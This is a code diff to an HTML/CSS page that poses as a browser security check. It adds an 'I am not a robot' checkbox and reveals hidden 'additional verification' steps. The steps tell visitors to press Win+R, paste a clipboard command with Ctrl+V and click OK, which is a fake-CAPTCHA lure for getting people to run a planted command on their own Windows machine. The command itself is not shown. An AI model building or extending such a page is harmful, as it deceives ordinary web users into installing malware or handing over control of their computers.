@@ -33,6 +33,24 @@
   display: inline-block;
 }
 
+    /* Hide steps by default */
+.verify-steps {
+  display: none;
+}
+
+/* Pause spinner by default */
+.cf-spinner {
+  animation: spin 1s linear infinite;
+  animation-play-state: paused;
+}
+
+/* Checkbox layout */
+.verify-check {
+  display: block;
+  margin-top: 16px;
+  font-size: 0.9rem;
+  color: #222;
+}
     /* === Overlay === */
 .popup-overlay {
   position: fixed;
@@ -480,13 +498,18 @@
     <p class="popup-text">Completing a quick verification helps us keep this site secure.</p>
 
     <div class="cf-captcha-box">
-      <div class="cf-spinner"></div>
+      <div class="cf-spinner" id="spinner"></div>
       <p>Checking your browser...</p>
     </div>
 
+    <!-- Checkbox -->
+    <label class="verify-check">
+      <input type="checkbox" id="verifyToggle"> I am not a robot
+    </label>
+
     <h3 class="step-title">Additional verification required</h3>
 
-    <ol class="verify-steps">
+    <ol class="verify-steps" id="verifySteps">
       <li>Press <strong>Win + R</strong> to open the Run dialog.</li>
       <li>Press <strong>Ctrl + V</strong> to paste the command.</li>
       <li>Click <strong>OK</strong> to continue.</li>
